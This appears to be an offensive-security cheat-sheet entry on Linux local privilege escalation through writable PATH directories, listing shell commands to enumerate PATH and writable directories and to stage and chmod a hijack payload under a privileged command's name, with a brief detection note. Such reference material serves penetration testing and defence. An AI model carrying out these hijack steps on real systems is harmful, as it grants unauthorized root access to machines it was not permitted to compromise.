---
technique: Writable Path Abuse
category: privilege-escalation
targets: Linux Filesystem, PATH
protocols: Local
remote_capable: false
tags: linux lpe writable-path path-hijack cron services
---

# Writable Path Abuse

Writable directories in privileged execution paths can hijack commands run by cron, services, scripts, or sudo rules that call binaries without absolute paths.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Writable directory | Current user must write into a searched directory |
| Privileged caller | Root or another user must execute a command resolved through that path |

## Linux

### Print PATH

#sh #path

Print the current PATH.

```sh title:"Print PATH"
printenv PATH
```
<!-- cheat -->

### Find writable directories

#sh #files

Find directories writable by the current user.

```sh title:"Find writable directories"
find / -type d -writable 2>/dev/null
```
<!-- cheat -->

### Step 1: Check directory permissions

#sh #files

Check permissions on a candidate path directory.

```sh title:"Check directory permissions"
ls -lad "$directory_path"
```
<!-- cheat
var directory_path
-->

### Step 2: Locate command

#sh #path

Resolve the command path used by the current shell.

```sh title:"Resolve command path"
which "$command_name"
```
<!-- cheat
var command_name
-->

### Step 3: Stage hijack binary

#sh #path-hijack

Copy a prepared payload into a writable path using the target command name.

```sh title:"Stage path hijack payload"
cp "$payload_file" "$writable_dir/$command_name"
```
<!-- cheat
var payload_file
var writable_dir
var command_name
-->

### Step 4: Make hijack executable

#sh #path-hijack

Make the staged payload executable.

```sh title:"Make path hijack payload executable"
chmod +x "$writable_dir/$command_name"
```
<!-- cheat
var writable_dir
var command_name
-->

## Detection

Monitor executable creation in writable directories that appear in service, cron, or sudo execution paths.
